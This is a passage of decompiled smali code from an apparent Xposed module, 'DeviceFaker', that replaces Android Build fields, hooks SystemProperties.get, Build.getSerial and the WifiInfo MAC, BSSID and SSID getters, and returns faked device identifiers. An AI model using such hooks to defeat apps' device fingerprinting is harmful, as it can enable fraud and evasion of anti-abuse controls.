    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->brand:Ljava/lang/String;

    invoke-static {v0, v4, v10}, Lde/robv/android/xposed/XposedHelpers;->setStaticObjectField(Ljava/lang/Class;Ljava/lang/String;Ljava/lang/Object;)V

    .line 1859
    :cond_5
    iget-object v0, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->device:Ljava/lang/String;

    if-eqz v0, :cond_6

    .line 1860
    const-class v0, Landroid/os/Build;

    const-string v4, "DEVICE"

    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->device:Ljava/lang/String;

    invoke-static {v0, v4, v10}, Lde/robv/android/xposed/XposedHelpers;->setStaticObjectField(Ljava/lang/Class;Ljava/lang/String;Ljava/lang/Object;)V

    .line 1861
    :cond_6
    iget-object v0, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->product:Ljava/lang/String;

    if-eqz v0, :cond_7

    .line 1862
    const-class v0, Landroid/os/Build;

    const-string v4, "PRODUCT"

    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->product:Ljava/lang/String;

    invoke-static {v0, v4, v10}, Lde/robv/android/xposed/XposedHelpers;->setStaticObjectField(Ljava/lang/Class;Ljava/lang/String;Ljava/lang/Object;)V

    .line 1863
    :cond_7
    iget-object v0, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->board:Ljava/lang/String;

    if-eqz v0, :cond_8

    .line 1864
    const-class v0, Landroid/os/Build;

    const-string v4, "BOARD"

    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->board:Ljava/lang/String;

    invoke-static {v0, v4, v10}, Lde/robv/android/xposed/XposedHelpers;->setStaticObjectField(Ljava/lang/Class;Ljava/lang/String;Ljava/lang/Object;)V

    .line 1865
    :cond_8
    iget-object v0, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->hardware:Ljava/lang/String;

    if-eqz v0, :cond_9

    .line 1866
    const-class v0, Landroid/os/Build;

    const-string v4, "HARDWARE"

    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->hardware:Ljava/lang/String;

    invoke-static {v0, v4, v10}, Lde/robv/android/xposed/XposedHelpers;->setStaticObjectField(Ljava/lang/Class;Ljava/lang/String;Ljava/lang/Object;)V

    .line 1867
    :cond_9
    iget-object v0, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->serialNumber:Ljava/lang/String;

    if-eqz v0, :cond_a

    .line 1868
    const-class v0, Landroid/os/Build;

    const-string v4, "SERIAL"

    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->serialNumber:Ljava/lang/String;

    invoke-static {v0, v4, v10}, Lde/robv/android/xposed/XposedHelpers;->setStaticObjectField(Ljava/lang/Class;Ljava/lang/String;Ljava/lang/Object;)V

    .line 1869
    :cond_a
    iget-object v0, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->fingerprint:Ljava/lang/String;

    if-eqz v0, :cond_b

    .line 1870
    const-class v0, Landroid/os/Build;

    const-string v4, "FINGERPRINT"

    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->fingerprint:Ljava/lang/String;

    invoke-static {v0, v4, v10}, Lde/robv/android/xposed/XposedHelpers;->setStaticObjectField(Ljava/lang/Class;Ljava/lang/String;Ljava/lang/Object;)V

    .line 1871
    :cond_b
    iget-object v0, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->buildId:Ljava/lang/String;

    if-eqz v0, :cond_c

    .line 1872
    const-class v0, Landroid/os/Build;

    const-string v4, "ID"

    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->buildId:Ljava/lang/String;

    invoke-static {v0, v4, v10}, Lde/robv/android/xposed/XposedHelpers;->setStaticObjectField(Ljava/lang/Class;Ljava/lang/String;Ljava/lang/Object;)V

    .line 1873
    :cond_c
    iget-object v0, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->buildDisplay:Ljava/lang/String;

    if-eqz v0, :cond_d

    .line 1874
    const-class v0, Landroid/os/Build;

    const-string v4, "DISPLAY"

    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->buildDisplay:Ljava/lang/String;

    invoke-static {v0, v4, v10}, Lde/robv/android/xposed/XposedHelpers;->setStaticObjectField(Ljava/lang/Class;Ljava/lang/String;Ljava/lang/Object;)V

    .line 1875
    :cond_d
    iget-object v0, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->buildType:Ljava/lang/String;

    if-eqz v0, :cond_e

    .line 1876
    const-class v0, Landroid/os/Build;

    const-string v4, "TYPE"

    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->buildType:Ljava/lang/String;

    invoke-static {v0, v4, v10}, Lde/robv/android/xposed/XposedHelpers;->setStaticObjectField(Ljava/lang/Class;Ljava/lang/String;Ljava/lang/Object;)V

    .line 1877
    :cond_e
    iget-object v0, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->buildTags:Ljava/lang/String;

    if-eqz v0, :cond_f

    .line 1878
    const-class v0, Landroid/os/Build;

    const-string v4, "TAGS"

    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->buildTags:Ljava/lang/String;

    invoke-static {v0, v4, v10}, Lde/robv/android/xposed/XposedHelpers;->setStaticObjectField(Ljava/lang/Class;Ljava/lang/String;Ljava/lang/Object;)V

    .line 1879
    :cond_f
    iget-object v0, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->bootloader:Ljava/lang/String;

    if-eqz v0, :cond_10

    .line 1880
    const-class v0, Landroid/os/Build;

    const-string v4, "BOOTLOADER"

    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->bootloader:Ljava/lang/String;

    invoke-static {v0, v4, v10}, Lde/robv/android/xposed/XposedHelpers;->setStaticObjectField(Ljava/lang/Class;Ljava/lang/String;Ljava/lang/Object;)V

    .line 1881
    :cond_10
    const-string v0, "DeviceFaker: \u2713 Set Build static fields"

    invoke-static {v0}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_e
    .catchall {:try_start_e .. :try_end_e} :catchall_8

    .line 1884
    goto :goto_9

    .line 1882
    :catchall_8
    move-exception v0

    .line 1883
    .restart local v0    # "t":Ljava/lang/Throwable;
    :try_start_f
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "DeviceFaker: \u2717 Build fields set failed: "

    invoke-virtual {v4, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v4, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_f
    .catchall {:try_start_f .. :try_end_f} :catchall_20

    .line 1892
    .end local v0    # "t":Ljava/lang/Throwable;
    :goto_9
    :try_start_10
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    .line 1893
    .local v0, "propMap":Ljava/util/HashMap;, "Ljava/util/HashMap<Ljava/lang/String;Ljava/lang/String;>;"
    iget-object v4, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->manufacturer:Ljava/lang/String;

    if-eqz v4, :cond_11

    .line 1894
    const-string v4, "ro.product.manufacturer"

    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->manufacturer:Ljava/lang/String;

    invoke-virtual {v0, v4, v10}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 1895
    :cond_11
    iget-object v4, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->model:Ljava/lang/String;

    if-eqz v4, :cond_12

    .line 1896
    const-string v4, "ro.product.model"

    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->model:Ljava/lang/String;

    invoke-virtual {v0, v4, v10}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 1897
    :cond_12
    iget-object v4, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->brand:Ljava/lang/String;

    if-eqz v4, :cond_13

    .line 1898
    const-string v4, "ro.product.brand"

    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->brand:Ljava/lang/String;

    invoke-virtual {v0, v4, v10}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 1899
    :cond_13
    iget-object v4, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->device:Ljava/lang/String;

    if-eqz v4, :cond_14

    .line 1900
    const-string v4, "ro.product.device"

    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->device:Ljava/lang/String;

    invoke-virtual {v0, v4, v10}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 1901
    :cond_14
    iget-object v4, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->product:Ljava/lang/String;

    if-eqz v4, :cond_15

    .line 1902
    const-string v4, "ro.product.name"

    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->product:Ljava/lang/String;

    invoke-virtual {v0, v4, v10}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 1903
    :cond_15
    iget-object v4, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->board:Ljava/lang/String;

    if-eqz v4, :cond_16

    .line 1904
    const-string v4, "ro.product.board"

    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->board:Ljava/lang/String;

    invoke-virtual {v0, v4, v10}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 1905
    :cond_16
    iget-object v4, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->hardware:Ljava/lang/String;

    if-eqz v4, :cond_17

    .line 1906
    const-string v4, "ro.hardware"

    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->hardware:Ljava/lang/String;

    invoke-virtual {v0, v4, v10}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 1907
    :cond_17
    iget-object v4, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->serialNumber:Ljava/lang/String;

    if-eqz v4, :cond_18

    .line 1908
    const-string v4, "ro.serialno"

    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->serialNumber:Ljava/lang/String;

    invoke-virtual {v0, v4, v10}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 1909
    :cond_18
    iget-object v4, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->fingerprint:Ljava/lang/String;

    if-eqz v4, :cond_19

    .line 1910
    const-string v4, "ro.build.fingerprint"

    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->fingerprint:Ljava/lang/String;

    invoke-virtual {v0, v4, v10}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 1911
    :cond_19
    iget-object v4, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->buildId:Ljava/lang/String;

    if-eqz v4, :cond_1a

    .line 1912
    const-string v4, "ro.build.id"

    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->buildId:Ljava/lang/String;

    invoke-virtual {v0, v4, v10}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 1913
    :cond_1a
    iget-object v4, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->buildDisplay:Ljava/lang/String;

    if-eqz v4, :cond_1b

    .line 1914
    const-string v4, "ro.build.display.id"

    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->buildDisplay:Ljava/lang/String;

    invoke-virtual {v0, v4, v10}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 1915
    :cond_1b
    iget-object v4, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->buildType:Ljava/lang/String;

    if-eqz v4, :cond_1c

    .line 1916
    const-string v4, "ro.build.type"

    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->buildType:Ljava/lang/String;

    invoke-virtual {v0, v4, v10}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 1917
    :cond_1c
    iget-object v4, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->buildTags:Ljava/lang/String;

    if-eqz v4, :cond_1d

    .line 1918
    const-string v4, "ro.build.tags"

    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->buildTags:Ljava/lang/String;

    invoke-virtual {v0, v4, v10}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 1919
    :cond_1d
    iget-object v4, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->bootloader:Ljava/lang/String;

    if-eqz v4, :cond_1e

    .line 1920
    const-string v4, "ro.bootloader"

    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->bootloader:Ljava/lang/String;

    invoke-virtual {v0, v4, v10}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 1924
    :cond_1e
    new-instance v4, Ljava/util/HashMap;

    invoke-direct {v4}, Ljava/util/HashMap;-><init>()V

    .line 1925
    .local v4, "extraProps":Ljava/util/HashMap;, "Ljava/util/HashMap<Ljava/lang/String;Ljava/lang/String;>;"
    invoke-virtual {v0}, Ljava/util/HashMap;->entrySet()Ljava/util/Set;

    move-result-object v10

    invoke-interface {v10}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v10

    :goto_a
    invoke-interface {v10}, Ljava/util/Iterator;->hasNext()Z

    move-result v11

    if-eqz v11, :cond_20

    invoke-interface {v10}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v11

    check-cast v11, Ljava/util/Map$Entry;

    .line 1926
    .local v11, "e":Ljava/util/Map$Entry;, "Ljava/util/Map$Entry<Ljava/lang/String;Ljava/lang/String;>;"
    invoke-interface {v11}, Ljava/util/Map$Entry;->getKey()Ljava/lang/Object;

    move-result-object v12

    check-cast v12, Ljava/lang/String;

    .line 1927
    .local v12, "key":Ljava/lang/String;
    invoke-interface {v11}, Ljava/util/Map$Entry;->getValue()Ljava/lang/Object;

    move-result-object v14

    check-cast v14, Ljava/lang/String;

    .line 1928
    .local v14, "val":Ljava/lang/String;
    invoke-virtual {v12, v7}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v15

    if-eqz v15, :cond_1f

    .line 1929
    invoke-virtual {v7}, Ljava/lang/String;->length()I

    move-result v15

    invoke-virtual {v12, v15}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v15

    .line 1930
    .local v15, "suffix":Ljava/lang/String;
    move-object/from16 v22, v7

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v23, v10

    const-string v10, "ro.product.odm."

    invoke-virtual {v7, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v7, v14}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 1931
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "ro.product.vendor."

    invoke-virtual {v7, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v7, v14}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 1932
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "ro.product.system."

    invoke-virtual {v7, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v7, v14}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 1933
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "ro.product.system_ext."

    invoke-virtual {v7, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v7, v14}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 1934
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "ro.product.product."

    invoke-virtual {v7, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v7, v14}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    goto :goto_b

    .line 1928
    .end local v15    # "suffix":Ljava/lang/String;
    :cond_1f
    move-object/from16 v22, v7

    move-object/from16 v23, v10

    .line 1936
    .end local v11    # "e":Ljava/util/Map$Entry;, "Ljava/util/Map$Entry<Ljava/lang/String;Ljava/lang/String;>;"
    .end local v12    # "key":Ljava/lang/String;
    .end local v14    # "val":Ljava/lang/String;
    :goto_b
    move-object/from16 v7, v22

    move-object/from16 v10, v23

    goto/16 :goto_a

    .line 1937
    :cond_20
    invoke-virtual {v0, v4}, Ljava/util/HashMap;->putAll(Ljava/util/Map;)V

    .line 1939
    const-string v7, "android.os.SystemProperties"

    iget-object v10, v2, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    invoke-static {v7, v10}, Lde/robv/android/xposed/XposedHelpers;->findClass(Ljava/lang/String;Ljava/lang/ClassLoader;)Ljava/lang/Class;

    move-result-object v7

    .line 1943
    .local v7, "sysPropClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    const-string v10, "get"

    new-instance v11, Lcom/rebel/module/XposedHook$29;

    invoke-direct {v11, v1, v0}, Lcom/rebel/module/XposedHook$29;-><init>(Lcom/rebel/module/XposedHook;Ljava/util/HashMap;)V

    invoke-static {v7, v10, v11}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;

    .line 1954
    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    const-string v11, "DeviceFaker: \u2713 Hooked SystemProperties.get() with "

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v0}, Ljava/util/HashMap;->size()I

    move-result v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, " properties"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_10
    .catchall {:try_start_10 .. :try_end_10} :catchall_9

    .line 1957
    .end local v0    # "propMap":Ljava/util/HashMap;, "Ljava/util/HashMap<Ljava/lang/String;Ljava/lang/String;>;"
    .end local v4    # "extraProps":Ljava/util/HashMap;, "Ljava/util/HashMap<Ljava/lang/String;Ljava/lang/String;>;"
    .end local v7    # "sysPropClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    goto :goto_c

    .line 1955
    :catchall_9
    move-exception v0

    .line 1956
    .local v0, "t":Ljava/lang/Throwable;
    :try_start_11
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "DeviceFaker: \u2717 SystemProperties hook failed: "

    invoke-virtual {v4, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_11
    .catchall {:try_start_11 .. :try_end_11} :catchall_20

    .line 1961
    .end local v0    # "t":Ljava/lang/Throwable;
    :goto_c
    :try_start_12
    const-class v0, Landroid/os/Build;

    const-string v4, "getSerial"

    new-instance v7, Lcom/rebel/module/XposedHook$30;

    invoke-direct {v7, v1, v3}, Lcom/rebel/module/XposedHook$30;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    filled-new-array {v7}, [Ljava/lang/Object;

    move-result-object v7

    invoke-static {v0, v4, v7}, Lde/robv/android/xposed/XposedHelpers;->findAndHookMethod(Ljava/lang/Class;Ljava/lang/String;[Ljava/lang/Object;)Lde/robv/android/xposed/XC_MethodHook$Unhook;

    .line 1968
    const-string v0, "DeviceFaker: \u2713 Hooked Build.getSerial()"

    invoke-static {v0}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_12
    .catchall {:try_start_12 .. :try_end_12} :catchall_a

    .line 1971
    goto :goto_d

    .line 1969
    :catchall_a
    move-exception v0

    .line 1970
    .restart local v0    # "t":Ljava/lang/Throwable;
    :try_start_13
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "DeviceFaker: \u2717 Build.getSerial hook failed: "

    invoke-virtual {v4, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_13
    .catchall {:try_start_13 .. :try_end_13} :catchall_20

    .line 1975
    .end local v0    # "t":Ljava/lang/Throwable;
    :goto_d
    :try_start_14
    const-string v0, "android.net.wifi.WifiInfo"

    iget-object v4, v2, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    invoke-static {v0, v4}, Lde/robv/android/xposed/XposedHelpers;->findClass(Ljava/lang/String;Ljava/lang/ClassLoader;)Ljava/lang/Class;

    move-result-object v0

    .line 1977
    .local v0, "wifiInfoClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    const/4 v4, 0x0

    .line 1978
    .local v4, "wc":I
    const-string v7, "getMacAddress"

    new-instance v10, Lcom/rebel/module/XposedHook$31;

    invoke-direct {v10, v1, v3}, Lcom/rebel/module/XposedHook$31;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    invoke-static {v0, v7, v10}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;

    move-result-object v7

    .line 1984
    invoke-interface {v7}, Ljava/util/Set;->size()I

    move-result v7

    add-int/2addr v4, v7

    .line 1985
    const-string v7, "getBSSID"

    new-instance v10, Lcom/rebel/module/XposedHook$32;

    invoke-direct {v10, v1, v3}, Lcom/rebel/module/XposedHook$32;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    invoke-static {v0, v7, v10}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;

    move-result-object v7

    .line 1991
    invoke-interface {v7}, Ljava/util/Set;->size()I

    move-result v7

    add-int/2addr v4, v7

    .line 1992
    const-string v7, "getSSID"

    new-instance v10, Lcom/rebel/module/XposedHook$33;

    invoke-direct {v10, v1, v3}, Lcom/rebel/module/XposedHook$33;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    invoke-static {v0, v7, v10}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;

    move-result-object v7

    .line 1998
    invoke-interface {v7}, Ljava/util/Set;->size()I

    move-result v7

    add-int/2addr v4, v7

    .line 1999
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v9, " WifiInfo methods"

    invoke-virtual {v7, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_14
    .catchall {:try_start_14 .. :try_end_14} :catchall_b

    .line 2002
    .end local v0    # "wifiInfoClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    .end local v4    # "wc":I
    goto :goto_e

    .line 2000
    :catchall_b
    move-exception v0

    .line 2001
    .local v0, "t":Ljava/lang/Throwable;
    :try_start_15
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "DeviceFaker: \u2717 WifiInfo hooks failed: "

    invoke-virtual {v4, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_15
    .catchall {:try_start_15 .. :try_end_15} :catchall_20

    .line 2006
    .end local v0    # "t":Ljava/lang/Throwable;
    :goto_e
    :try_start_16
    const-string v0, "android.bluetooth.BluetoothAdapter"

    iget-object v4, v2, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    invoke-static {v0, v4}, Lde/robv/android/xposed/XposedHelpers;->findClass(Ljava/lang/String;Ljava/lang/ClassLoader;)Ljava/lang/Class;

    move-result-object v0

    .line 2008
